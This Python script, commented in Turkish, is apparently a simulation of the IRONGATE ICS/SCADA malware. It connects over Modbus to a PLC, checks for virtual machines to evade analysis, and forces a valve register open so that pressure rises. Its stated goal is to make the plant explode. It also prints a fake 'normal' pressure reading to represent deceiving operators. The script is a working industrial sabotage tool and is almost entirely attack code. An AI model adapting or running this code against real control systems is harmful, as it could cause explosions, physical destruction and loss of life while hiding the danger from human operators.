import time
import sys
from pymodbus.client import ModbusTcpClient
import threading
import os

# === IRONGATE Gelişmiş ICS/SCADA Ajanı ===
# Hedef: PLC'nin basınç değerini manipüle edip santrali patlatmak
# Özellik: Man-in-the-Middle (MITM) gibi davranıp operatöre sahte "Normal" veri göstermek.

TARGET_IP = "127.0.0.1"
TARGET_PORT = 5020

class IronGatePayload:
    def __init__(self):
        self.client = ModbusTcpClient(TARGET_IP, port=TARGET_PORT)
        self.connected = False

    def anti_vm_check(self):
        """
        IronGate'in meşhur Anti-VM tekniği.
        VMware I/O portlarını kontrol eder (Linux uyumlu basit versiyon).
        """
        # Basit bir MAC adresi kontrolü (Daha önce yaptığımızın benzeri)
        # Gerçek IronGate Assembly instructionları kullanır, biz Python ile simüle ediyoruz.
        print("[*] Ortam analizi yapılıyor (Anti-Analysis)...")
        # Eğer /sys/class/dmi/id/product_name içinde VMware yazıyorsa dur.
        try:
            with open('/sys/class/dmi/id/product_name', 'r') as f:
                if "VMware" in f.read() or "VirtualBox" in f.read():
                    print("[!] UYARI: Sanal Makine tespit edildi! Uyku moduna geçiliyor...")
                    # sys.exit(0) # Gerçekte çıkar, eğitim için devam ediyoruz uyararak.
        except:
            pass # Dosya yoksa muhtemelen bare-metal veya erişim yok
        
        print("[+] Ortam güvenli. Payload aktif.")

    def attack(self):
        if not self.client.connect():
            print("[-] Hedef PLC'ye bağlanılamadı!")
            return

        print(f"[+] PLC Bağlantısı Kuruldu: {TARGET_IP}:{TARGET_PORT}")
        print("[*] Sessiz modda izleme yapılıyor...")
        
        try:
            while True:
                # 1. Mevcut Durumu Oku
                rr = self.client.read_holding_registers(0, 5, slave=1)
                if rr.isError():
                    print("[-] Okuma hatası")
                    break
                
                real_pressure = rr.registers[0]
                valve_status = rr.registers[1]
                
                # 2. SALDIRI MANTIĞI: Sabotaj
                # Eğer basınç henüz patlama noktasında değilse, vanayı aç!
                if real_pressure < 80:
                    print(f"[SALDIRI] Basınç çok düşük ({real_pressure} Bar). Vanayı zorla açıyorum...")
                    # Register 1 (Vana) -> 1 (AÇIK)
                    self.client.write_register(1, 1, slave=1)
                
                # 3. GİZLENME (Replay Attack / False Data Injection)
                # Operatör sistemi izliyorsa, vanayı KAPALI, basıncı NORMAL görsün.
                # Ama aslında vana açık ve basınç artıyor.
                # Not: Modbus'ta okumayı manipüle etmek için genellikle ARP Spoofing gerekir.
                # Bu simülasyonda biz sadece "yazma" saldırısı yapıyoruz.
                # "Hayalet" etkisi yaratmak için terminale sahte log basıyoruz:
                
                sys.stdout.write(f"\r[GİZLİ LOG] Operatöre Gösterilen: Basınç=50 Bar (Sabit) | Gerçek: {real_pressure} Bar")
                sys.stdout.flush()
                
                time.sleep(1)

        except KeyboardInterrupt:
            print("\n[*] Saldırı durduruldu. İzler temizleniyor...")
            # Vanayı kapatıp çık
            self.client.write_register(1, 0, slave=1)
            self.client.close()

if __name__ == "__main__":
    print("""
    ██╗██████╗  ██████╗ ███╗   ██╗ ██████╗  █████╗ ████████╗███████╗
    ██║██╔══██╗██╔═══██╗████╗  ██║██╔════╝ ██╔══██╗╚══██╔══╝██╔════╝
    ██║██████╔╝██║   ██║██╔██╗ ██║██║  ███╗███████║   ██║   █████╗  
    ██║██╔══██╗██║   ██║██║╚██╗██║██║   ██║██╔══██║   ██║   ██╔══╝  
    ██║██║  ██║╚██████╔╝██║ ╚████║╚██████╔╝██║  ██║   ██║   ███████╗
    ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝
            ICS/SCADA Manipulation Framework - v1.0
    """)
    agent = IronGatePayload()
    agent.anti_vm_check()
    agent.attack()
